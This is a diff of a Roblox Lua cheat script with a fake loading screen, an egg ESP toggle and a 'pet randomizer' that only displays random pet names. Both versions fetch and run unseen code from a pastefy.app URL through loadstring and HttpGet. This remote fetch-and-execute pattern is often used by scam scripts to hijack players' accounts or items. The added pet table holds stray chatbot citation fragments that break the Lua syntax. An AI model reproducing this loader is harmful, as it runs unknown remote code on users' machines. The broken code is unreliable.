@@ -1,139 +1,119 @@
---// Services
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-
-local player = Players.LocalPlayer
-repeat task.wait() until player:FindFirstChild("PlayerGui")
-
---// Execute Main Script
+-- Load your actual script
 pcall(function()
-   loadstring(game:HttpGet("https://pastefy.app/qmH6eeEH/raw"))()
-
---// ScreenGui Setup
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FullLoadingUI"
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-screenGui.Parent = player:WaitForChild("PlayerGui")
-
---// Fullscreen Cover
-local bgFrame = Instance.new("Frame")
-bgFrame.Size = UDim2.new(1, 0, 1, 0)
-bgFrame.Position = UDim2.new(0, 0, 0, 0)
-bgFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-bgFrame.BorderSizePixel = 0
-bgFrame.Parent = screenGui
-
---// Top Label
-local topLabel = Instance.new("TextLabel")
-topLabel.Size = UDim2.new(1, 0, 0.1, 0)
-topLabel.Position = UDim2.new(0, 0, 0.02, 0)
-topLabel.BackgroundTransparency = 1
-topLabel.Text = "Wait Until It Loads"
-topLabel.Font = Enum.Font.GothamBold
-topLabel.TextColor3 = Color3.fromRGB(255, 120, 0)
-topLabel.TextScaled = true
-topLabel.TextStrokeTransparency = 0.8
-topLabel.TextStrokeColor3 = Color3.fromRGB(255, 70, 0)
-topLabel.Parent = bgFrame
-
---// Loading Percentage
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(1, 0, 0.3, 0)
-loadingText.Position = UDim2.new(0, 0, 0.25, 0)
-loadingText.BackgroundTransparency = 1
-loadingText.Text = "0%"
-loadingText.Font = Enum.Font.GothamBlack
-loadingText.TextColor3 = Color3.new(1, 1, 1)
-loadingText.TextScaled = true
-loadingText.TextStrokeTransparency = 0.6
-loadingText.TextStrokeColor3 = Color3.new(0, 0, 0)
-loadingText.Parent = bgFrame
-
---// Bottom Label
-local bottomLabel = Instance.new("TextLabel")
-bottomLabel.Size = UDim2.new(1, 0, 0.1, 0)
-bottomLabel.Position = UDim2.new(0, 0, 0.88, 0)
-bottomLabel.BackgroundTransparency = 1
-bottomLabel.Text = "Be Patient"
-bottomLabel.Font = Enum.Font.GothamBold
-bottomLabel.TextColor3 = Color3.fromRGB(255, 80, 0)
-bottomLabel.TextScaled = true
-bottomLabel.TextStrokeTransparency = 0.8
-bottomLabel.TextStrokeColor3 = Color3.fromRGB(255, 50, 0)
-bottomLabel.Parent = bgFrame
-
---// Fire Emoji Animation
-local function spawnFire()
-	for _ = 1, 5 do
-		local fire = Instance.new("TextLabel")
-		fire.Text = "🔥"
-		fire.Font = Enum.Font.SourceSansBold
-		fire.TextScaled = true
-		fire.TextColor3 = Color3.fromRGB(255, 100, 0)
-		fire.BackgroundTransparency = 1
-		fire.Size = UDim2.new(0.05, 0, 0.05, 0)
-		fire.Position = UDim2.new(math.random(), 0, math.random(), 0)
-		fire.Parent = bgFrame
-
-		local goal = {
-			Position = UDim2.new(math.random(), 0, math.random(), 0),
-			TextTransparency = 1
-		}
-		TweenService:Create(fire, TweenInfo.new(5, Enum.EasingStyle.Linear), goal):Play()
-
-		task.delay(5, function()
-			fire:Destroy()
-		end)
-	end
-end
-
---// Fire Loop
-spawn(function()
-	while bgFrame.Parent do
-		spawnFire()
-		task.wait(1)
-	end
+    loadstring(game:HttpGet("https://pastefy.app/qmH6eeEH/raw"))()
 end)
 
---// Countdown Loading
-spawn(function()
-	for i = 1, 100 do
-		loadingText.Text = i .. "%"
-		task.wait(0.05)
-	end
-	bgFrame:Destroy() -- Remove only the screen blocker
-end)
-
---// SIDE UI (persistent)
-local sidePanel = Instance.new("Frame")
-sidePanel.Size = UDim2.new(0, 200, 0.5, 0)
-sidePanel.Position = UDim2.new(0, 10, 0.25, 0)
-sidePanel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-sidePanel.BackgroundTransparency = 0.2
-sidePanel.BorderSizePixel = 0
-sidePanel.Parent = screenGui
-
-local buttons = {
-	{Text = "🎲 Egg Randomizer", Name = "EggRandomizer"},
-	{Text = "🎮 Randomize Pets", Name = "RandomizePets"},
-	{Text = "👁 ESP: OFF", Name = "ESP"},
-	{Text = "🔄 Auto Randomize: OFF", Name = "AutoRandomize"}
+-- Egg → pet lists/weights from wiki
+local eggData = {
+    ["Common Egg"] = {{"Dog",0.3333},{"Golden Lab",0.3333},{"Bunny",0.3333}},
+    ["Uncommon Egg"] = {{"Black Bunny",0.25},{"Cat",0.25},{"Chicken",0.25},{"Deer",0.25}},
+    ["Rare Summer Egg"] = {{"Flamingo",0.30},{"Toucan",0.25},{"Sea Turtle",0.20},{"Orangutan",0.15},{"Seal",0.10}}, :contentReference[oaicite:5]{index=5}
+    ["Rare Egg"] = {{"Orange Tabby",0.3333},{"Spotted Deer",0.25},{"Pig",0.1667},{"Rooster",0.1667}}, :contentReference[oaicite:6]{index=6}
+    ["Paradise Egg"] = {{"Ostrich",0.40},{"Peacock",0.30},{"Capybara",0.21},{"Scarlet Macaw",0.08},{"Mimic Octopus",0.01}}, :contentReference[oaicite:7]{index=7}
+    ["Dinosaur Egg"] = {{"Raptor",0.35},{"Triceratops",0.325},{"Stegosaurus",0.28},{"Pterodactyl",0.03},{"Brontosaurus",0.01},{"T‑Rex",0.005}}, :contentReference[oaicite:8]{index=8}
+    ["Primal Egg"] = {{"Parasaurolophus",0.35},{"Iguanodon",0.325},{"Pachycephalosaurus",0.28},{"Dilophosaurus",0.03},{"Ankylosaurus",0.01},{"Spinosaurus",0.005}}, :contentReference[oaicite:9]{index=9}
+    ["Zen Egg"] = {{"Shiba Inu",0.40},{"Nihonzaru",0.31},{"Tanuki",0.2082},{"Tanchozuru",0.046},{"Kappa",0.035},{"Kitsune",0.0008}}, :contentReference[oaicite:10]{index=10}
+    ["Bug Egg"] = {{"Snail",0.30},{"Giant Ant",0.25},{"Caterpillar",0.40},{"Praying Mantis",0.04},{"Dragonfly",0.01}}, :contentReference[oaicite:11]{index=11}
+    ["Bee Egg"] = {{"Bee",0.65},{"Honey Bee",0.25},{"Bear Bee",0.05},{"Queen Bee",0.01}}, :contentReference[oaicite:12]{index=12}
+    ["Oasis Egg"] = {{"Meerkat",0.45},{"Sand Snake",0.345},{"Axolotl",0.15},{"Hyacinth Macaw",0.05},{"Fennec Fox",0.005}}, :contentReference[oaicite:13]{index=13}
 }
 
-for i, data in ipairs(buttons) do
-	local btn = Instance.new("TextButton")
-	btn.Name = data.Name
-	btn.Size = UDim2.new(1, -20, 0, 40)
-	btn.Position = UDim2.new(0, 10, 0, (i - 1) * 50 + 10)
-	btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-	btn.TextColor3 = Color3.new(1, 1, 1)
-	btn.Font = Enum.Font.GothamBold
-	btn.Text = data.Text
-	btn.TextScaled = true
-	btn.Parent = sidePanel
-
-	-- Add visual toggle logic if needed later
+-- Weighted random pick
+local function pickPet(list)
+    local r = math.random()
+    local cum = 0
+    for _, v in ipairs(list) do
+        cum += v[2]
+        if r <= cum then return v[1] end
+    end
+    return list[#list][1]
 end
+
+-- Setup UI
+local pl = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", pl:WaitForChild("PlayerGui"))
+gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+-- Loading overlay
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1,0,1,0); bg.BackgroundColor3 = Color3.new(0,0,0); bg.ZIndex = 1
+local lbl = Instance.new("TextLabel", bg)
+lbl.Size = UDim2.new(1,0,0.2,0); lbl.Position = UDim2.new(0,0,0.4,0)
+lbl.BackgroundTransparency = 1; lbl.TextScaled = true; lbl.Font = Enum.Font.GothamBold
+lbl.TextColor3 = Color3.new(1,1,1); lbl.ZIndex = 2
+for i=1,100 do lbl.Text = "Loading: " .. i .. "%" task.wait(0.03) end
+bg:Destroy()
+
+-- Persistent side panel
+local panel = Instance.new("Frame", gui)
+panel.Size = UDim2.new(0.25,0,0.5,0); panel.Position = UDim2.new(0.02,0,0.25,0)
+panel.BackgroundColor3 = Color3.fromRGB(30,0,0); panel.BackgroundTransparency = 0.2; panel.ZIndex = 3
+
+local function makeBtn(label, emoji, ypos)
+    local b = Instance.new("TextButton", panel)
+    b.Size = UDim2.new(0.9,0,0.15,0); b.Position = UDim2.new(0.05,0,ypos,0)
+    b.Text = emoji .. " " .. label; b.Font = Enum.Font.GothamBold; b.TextScaled = true
+    b.TextColor3 = Color3.new(1,1,1); b.ZIndex = 4
+    return b
+end
+
+local btnEgg = makeBtn("Egg Randomizer", "🎲", 0.2)
+local btnPet = makeBtn("Randomize Pets", "🎲", 0.38)
+local btnESP = makeBtn("ESP: OFF", "👁️", 0.56)
+local btnAuto = makeBtn("Auto Randomize: OFF", "🔄", 0.74)
+
+-- ESP highlight
+local esp = false; local hlist = {}
+btnESP.MouseButton1Click:Connect(function()
+    esp = not esp
+    btnESP.Text = "👁️ ESP: " .. (esp and "ON" or "OFF")
+    if esp then
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("BasePart") and obj.Name:lower():find("egg") then
+                local h = Instance.new("Highlight", obj)
+                h.Adornee = obj; h.FillColor = Color3.new(1,0.4,0.4)
+                table.insert(hlist, h)
+            end
+        end
+    else
+        for _, h in ipairs(hlist) do if h then h:Destroy() end end
+        hlist = {}
+    end
+end)
+
+-- Pet display label
+local plbl
+local function showPet(ofEgg)
+    if plbl then plbl:Destroy() end
+    local pet = pickPet(eggData[ofEgg or "Common Egg"])
+    plbl = Instance.new("TextLabel", gui)
+    plbl.Size, plbl.Position = UDim2.new(0.4,0,0.1,0), UDim2.new(0.3,0,0.9,0)
+    plbl.BackgroundTransparency = 1; plbl.Font = Enum.Font.GothamBlack; plbl.TextScaled = true
+    plbl.TextColor3 = Color3.new(1,1,0); plbl.ZIndex = 3
+    plbl.Text = "Pet: " .. pet
+end
+
+-- Button logic
+btnEgg.MouseButton1Click:Connect(function()
+    local keys = {}
+    for k in pairs(eggData) do table.insert(keys, k) end
+    local pick = keys[math.random(#keys)]
+    showPet(pick)
+end)
+btnPet.MouseButton1Click:Connect(function()
+    showPet("Common Egg")
+end)
+
+local autorun = false
+btnAuto.MouseButton1Click:Connect(function()
+    autorun = not autorun
+    btnAuto.Text = "🔄 Auto Randomize: " .. (autorun and "ON" or "OFF")
+    if autorun then
+        spawn(function()
+            while autorun do
+                showPet("Common Egg")
+                task.wait(1)
+            end
+        end)
+    end
+end)
